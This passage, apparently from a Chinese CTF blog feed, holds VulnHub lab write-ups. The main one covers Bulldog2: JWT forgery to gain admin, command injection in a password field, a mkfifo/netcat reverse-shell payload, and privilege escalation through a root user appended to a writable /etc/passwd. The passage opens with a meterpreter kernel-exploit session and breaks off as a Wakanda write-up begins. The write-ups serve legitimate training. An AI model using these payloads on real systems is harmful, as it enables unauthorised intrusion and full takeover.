class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux ubuntu 2.6.35-19-generic <span class="comment">#28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; upload /home/kali-team/Kali-Team/exploit-database/exploits/linux_x86-64/<span class="built_in">local</span>/15023.c</span><br><span class="line">[*] uploading  : /home/kali-team/Kali-Team/exploit-database/exploits/linux_x86-64/<span class="built_in">local</span>/15023.c -&gt; 15023.c</span><br><span class="line">[*] Uploaded -1.00 B of 5.17 KiB (-0.02%): /home/kali-team/Kali-Team/exploit-database/exploits/linux_x86-64/<span class="built_in">local</span>/15023.c -&gt; 15023.c</span><br><span class="line">[*] uploaded   : /home/kali-team/Kali-Team/exploit-database/exploits/linux_x86-64/<span class="built_in">local</span>/15023.c -&gt; 15023.c</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /tmp</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  5297   fil   2018-10-27 09:35:19 +0800  15023.c</span><br><span class="line">100644/rw-r--r--  25298  fil   2018-10-27 09:30:57 +0800  15024.c</span><br><span class="line">100644/rw-r--r--  8835   fil   2018-10-27 09:27:09 +0800  15150.c</span><br><span class="line">100644/rw-r--r--  9487   fil   2018-10-27 09:24:34 +0800  15704.c</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell </span><br><span class="line">Process 1287 created.</span><br><span class="line">Channel 8 created.</span><br><span class="line">gcc 15023.c</span><br><span class="line">ls</span><br><span class="line">15023.c</span><br><span class="line">15024.c</span><br><span class="line">15150.c</span><br><span class="line">15704.c</span><br><span class="line">a.out</span><br><span class="line">./a.out</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">8f420533b79076cc99e9f95a1a4e5568</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-up-Bulldog2</title>
      <link href="/2018/10/25/Write-up-Bulldog2/"/>
      <url>/2018/10/25/Write-up-Bulldog2/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li><p>下载地址：<a href="https://download.vulnhub.com/bulldog/Bulldog2.ova" target="_blank" rel="noopener">点我</a></p></li><li><p>哔哩哔哩：<a href="https://www.bilibili.com/video/av34621480" target="_blank" rel="noopener">哔哩哔哩</a></p></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>网卡：vboxnet0，192.168.56.1/24，Nmap扫存活主机发现IP为192.168.56.101</li></ul><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn 192.168.56.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-25 20:48 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.1</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 3.02 seconds</span><br><span class="line">➜  ~ </span><br><span class="line">➜  ~ nmap -T4 -A 192.168.56.101</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-25 20:49 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Bulldog.social</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.35 seconds</span><br></pre></td></tr></table></figure><ul><li>发现只开了80端口，所以只能从Web入手了，浏览器打开看插件可知编程语言是Node-js，整个页面也只加载了几个js和css文件，而且查看网页源码发现只有一行。正常的开发者是不会这么写的，太难看了，格式化一下，页面也没什么特效，加载的js文件有点多啊，问题肯定在js里。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">Bulldog.social</span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/assets/bootstrap.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"/assets/styles.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/assets/particles.min.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> <span class="attr">href</span>=<span class="string">"favicon.ico"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"styles.7decb11e9986af81075e.bundle.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"particles-js"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">app-root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">app-root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/about"</span>&gt;</span></span><br><span class="line">About Us |</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">Twitter |</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">Instagram</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"inline.7a6fe116b23fa31a9970.bundle.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"polyfills.f056ccbeb07b92448c13.bundle.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vendor.0ce9a4a4addea27177ca.bundle.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"main.8b490782e52b9899e2a7.bundle.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">particlesJS.load(<span class="string">'particles-js'</span>, <span class="string">'/assets/particles/particlesjs-config.json'</span>,</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>到处点，发现关闭了注册功能，但在main.8b490782e52b9899e2a7.bundle.js这个文件里找到了注册功能，只要安照json格式发送请求就可以注册成功了。</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l.prototype.onRegisterSubmit = function() &#123;</span><br><span class="line"><span class="keyword">var</span> l = <span class="keyword">this</span>,</span><br><span class="line">n = &#123;</span><br><span class="line">name: <span class="keyword">this</span>.name,</span><br><span class="line">email: <span class="keyword">this</span>.email,</span><br><span class="line">username: <span class="keyword">this</span>.username,</span><br><span class="line">password: <span class="keyword">this</span>.password</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="绕过注册"><a href="#绕过注册" class="headerlink" title="绕过注册"></a>绕过注册</h3><ul><li>数据包</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users/register</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.56.101</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.56.101/login</span><br><span class="line"><span class="attribute">content-type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 99</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "name": "kt",</span><br><span class="line">  "email": "root@kali-team.cn",</span><br><span class="line">  "username": "kt",</span><br><span class="line">  "password": "123456"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>返回用户已经注册，登录试试。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.0 (Ubuntu)</span><br><span class="line"><span class="attribute">Date</span>: Wed, 24 Oct 2018 08:36:19 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 40</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: Express</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">ETag</span>: W/"28-r22PRevV1bosgiTQ0L7/zW61meQ"</span><br><span class="line"></span><br><span class="line">&#123;"success":true,"msg":"User registered"&#125;</span><br></pre></td></tr></table></figure><h3 id="获取管理员权限"><a href="#获取管理员权限" class="headerlink" title="获取管理员权限"></a>获取管理员权限</h3><ul><li>登录后返回一串字符，里面有一个键为<code>auth_level</code>的值翻译过来是标准用户，即不是管理员。发现token有一个JWT，谷歌找到一个解密网站<a href="https://jwt.io/" target="_blank" rel="noopener">点我</a>。</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"success"</span>:<span class="literal">true</span>,<span class="attr">"token"</span>:<span class="string">"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJrdCIsImVtYWlsIjoicm9vdEBrYWxpLXRlYW0uY24iLCJ1c2VybmFtZSI6Imt0IiwiYXV0aF9sZXZlbCI6InN0YW5kYXJkX3VzZXIifSwiaWF0IjoxNTQwMzcwNTYzLCJleHAiOjE1NDA5NzUzNjN9.miulCBmgpn_NqFHppjlk-zzJsSrdgCvdHZTP395Hbjg"</span>,<span class="attr">"user"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"kt"</span>,<span class="attr">"username"</span>:<span class="string">"kt"</span>,<span class="attr">"email"</span>:<span class="string">"root@kali-team.cn"</span>,<span class="attr">"auth_level"</span>:<span class="string">"standard_user"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>然后解密得到下面内容，就是我注册时的信息啊，通过搜索js里的<code>auth_level</code>找到判断是否是管理员权限的地方找到了<code>master_admin_user</code>，想着是不是把<code>standard_user</code>改<code>master_admin_user</code>就能拿到管理员权限了。</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"payload"</span>: &#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"kt"</span>,</span><br><span class="line">    <span class="attr">"email"</span>: <span class="string">"root@kali-team.cn"</span>,</span><br><span class="line">    <span class="attr">"username"</span>: <span class="string">"kt"</span>,</span><br><span class="line">    <span class="attr">"auth_level"</span>: <span class="string">"standard_user"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"iat"</span>: <span class="number">1540370563</span>,</span><br><span class="line">  <span class="attr">"exp"</span>: <span class="number">1540975363</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l.prototype.isAdmin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> l = localStorage.getItem(<span class="string">"user"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span> !== l &amp;&amp; <span class="string">"master_admin_user"</span> == <span class="built_in">JSON</span>.parse(l).auth_level</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ul><li>然后在解密平台上把<code>auth_level</code>的值改为<code>master_admin_user</code>再把加密后的token替换原来的 ，明文的也一起改了，再放行数据，在浏览器这边已经方形用户成为管理员权限了。</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>打开管理员的控制面板看到CLI Tool，第一眼看上去是不是想到命令行工具。Nodejs执行命令一般都会用exec创建子进程执行，找到<code>routes/users.js</code>文件有一段可能存在命令执行漏洞的代码。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/linkauthenticate'</span>, (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> username = req.body.password;</span><br><span class="line">  <span class="keyword">const</span> password = req.body.password;</span><br><span class="line"></span><br><span class="line">  exec(<span class="string">`linkplus -u <span class="subst">$&#123;username&#125;</span> -p <span class="subst">$&#123;password&#125;</span>`</span>, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">`exec error: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>当请求改密码时会执行<code>linkplus -u ${username} -p ${password}</code>我们在后面跟着想执行的命令就可以了，因为没有回显，所以也不知道命令有没有执行成功，你们可以用DNSlog测试，我在这就ping我自己的电脑，抓包证明一下就好了，可以看出是命令执行成功了的。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users/linkauthenticate</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.56.101</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.56.101/dashboard</span><br><span class="line"><span class="attribute">content-type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 73</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "username": "kt",</span><br><span class="line">  "password": "1234566  ; ping 192.168.56.1 -c 4"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">110.005424306192.168.56.101192.168.56.1ICMP98Echo (ping) request  id=0x61fd, seq=1/256, ttl=64 (reply <span class="keyword">in</span> 12)</span><br><span class="line">120.005440583192.168.56.1192.168.56.101ICMP98Echo (ping) reply    id=0x61fd, seq=1/256, ttl=64 (request <span class="keyword">in</span> 11)</span><br></pre></td></tr></table></figure><h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><ul><li>因为json请求里有了引号，所以很多反弹的方法都不管用了，但找到了一种没有引号的</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users/linkauthenticate</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.56.101</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.56.101/dashboard</span><br><span class="line"><span class="attribute">content-type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 123</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "username": "kt",</span><br><span class="line">  "password": "1  ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 7788 &gt;/tmp/f"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>NC已经返回shell了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -lvp 7788</span><br><span class="line">Connection from 192.168.56.101:37834</span><br><span class="line">/bin/sh: 0: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1001(node) gid=1005(node) groups=1005(node)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul><li><p><code>find / -writable -type f 2&gt;/dev/null | grep -v &quot;/proc/&quot;</code>找出所有可写的root用户的文件，发现<code>/etc/passwd</code>文件可写。</p></li><li><p>生成密码</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl passwd -1 -salt kt 123</span><br><span class="line"><span class="variable">$1</span><span class="variable">$kt</span><span class="variable">$mR</span>/jSFSDV/G0vNQ72T8cs.</span><br></pre></td></tr></table></figure><ul><li>添加用户<code>$ echo &quot;kt:\$1\$kt\$mR/jSFSDV/G0vNQ72T8cs.:0:0:root:/root:/bin/bash&quot; &gt;&gt; passwd</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">node@bulldog2:/etc$ su kt</span><br><span class="line">su kt</span><br><span class="line">Password: 123</span><br><span class="line">root@bulldog2:/etc<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@bulldog2:/etc<span class="comment"># </span></span><br><span class="line">root@bulldog2:/etc<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@bulldog2:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@bulldog2:~<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">Congratulations on completing this VM :D That wasn<span class="string">'t so bad was it?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let me know what you thought on twitter, I'</span>m @frichette_n</span><br><span class="line"></span><br><span class="line">I<span class="string">'m already working on another more challenging VM. Follow me for updates.</span></span><br><span class="line"><span class="string">root@bulldog2:~#</span></span><br></pre></td></tr></table></figure><ul><li>Flag到手！</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-Up-wakanda-1</title>
      <link href="/2018/10/16/Write-up-wakanda-1/"/>
      <url>/2018/10/16/Write-up-wakanda-1/</url>
      
        <content type="html"><![CDATA[<h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><ul><li><p>下载地址：<a href="https://www.vulnhub.com/entry/wakanda-1,251/#download" target="_blank" rel="noopener">点我</a></p></li><li><p>哔哩哔哩：<a href="https://www.bilibili.com/video/av34064129" target="_blank" rel="noopener">哔哩哔哩</a></p></li></ul><h2 id="祖传开头"><a href="#祖传开头" class="headerlink" title="祖传开头"></a>祖传开头</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>这里用vm虚拟机可能有一点问题，因为官方的是用vbox虚拟机导出的镜像文件。所以这次使用vbox虚拟机。</li></ul><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip a show dev vboxnet0 </span><br><span class="line">6: vboxnet0: 